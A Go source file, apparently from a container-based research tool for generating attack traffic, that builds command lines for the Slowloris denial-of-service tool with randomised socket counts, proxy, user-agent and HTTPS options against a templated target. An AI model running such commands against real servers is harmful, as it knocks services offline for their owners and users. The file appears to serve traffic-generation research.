package atktools

import (
	"fmt"
	"math/rand"
	"time"

	"gitlab.ilabt.imec.be/lpdhooge/containercap/scenario"
)

type Slowloris struct {
	scenarioType scenario.ScenarioType
	weight       int
	parts        []string
	targetDomain string
}

func NewSlowloris() Slowloris {
	slowloris := Slowloris{weight: 10, scenarioType: scenario.Scanning, targetDomain: "{{.TargetAddress}}"}
	return slowloris
}

// For more flags: https://github.com/gkbrk/slowloris
func (slowloris Slowloris) BuildAtkCommand() []string {
	rand.Seed(time.Now().UnixNano())
	slowloris.parts = []string{"python3", "slowloris.py"}
	slowloris.parts = append(slowloris.parts, "--sockets", fmt.Sprint(rand.Intn(100)+150), slowloris.targetDomain)
	slowloris.parts = append(slowloris.parts, "-p 80")
	if rand.Float32() < 0.33 {
		slowloris.parts = append(slowloris.parts, "--randuseragents")
	}
	if rand.Float32() < 0.33 {
		slowloris.parts = append(slowloris.parts, "--useproxy")
	}
	if rand.Float32() < 0.33 {
		slowloris.parts = append(slowloris.parts, "--https")
	}
	return slowloris.parts
}

func (slowloris Slowloris) Weight() int {
	return slowloris.weight
}

func (slowloris Slowloris) ScenarioType() scenario.ScenarioType {
	return slowloris.scenarioType
}
